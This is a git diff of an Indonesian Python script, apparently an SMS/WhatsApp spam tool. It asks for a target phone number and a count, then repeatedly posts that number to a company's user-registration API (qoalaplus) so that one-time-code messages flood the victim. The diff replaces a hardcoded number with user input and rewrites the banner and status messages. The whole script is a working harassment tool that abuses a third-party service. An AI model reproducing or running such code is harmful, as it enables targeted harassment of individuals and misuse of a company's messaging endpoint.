@@ -1,5 +1,5 @@
-#Ximon hack bulan
-#confryg By H7
+#Selamat Berlatih 
+#confryg By H7 maker
 import requests,json
 
 # import module
@@ -11,8 +11,8 @@ os.system("clear")
 
 k = 0
 print("\33[37;1m——————————————————————————\33[37;1m")
-print("\33[31;1mSPAM SMS BUAT Kucing :V\33[31;1m")
-print("\33[37;1mJANGAN LUPA TAKUT TAKUTIN kecebong!!\33[37;1m")
+print("\33[31;1mSPAM SMS bluew dek:V\33[31;1m")
+print("\33[37;1minggat dari kasur adalah berdidi dari tempat rebahan!\33[37;1m")
 print("NOPE DI AWALI 8Xxxxx")
 print("——————————————————————————")
 nomer = input("Nomer Target : ")
@@ -32,9 +32,9 @@ for k in range(jumlah):
   "referer": "https://www.qoalaplus.com/",
   "accept-encoding": "gzip, deflate, br",
   "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-  data = json.dumps({"phone_number":"+62"+628385880430,"channel":"WA"})
+  data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
   pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
   if "success" in pos:
-    print("ANJAY SPAM WhatsApp Berhasil:)",k)
+    print("ANJAY SPAM blue Berhasil:)",k)
   else:
-    print("Makannya Ganteng Biar Gak gagal ASIK KAN YO SPAM LAGI",k)
+    print("slebewwwwww 🙁🤑🤢🤑🤢🤑",k)
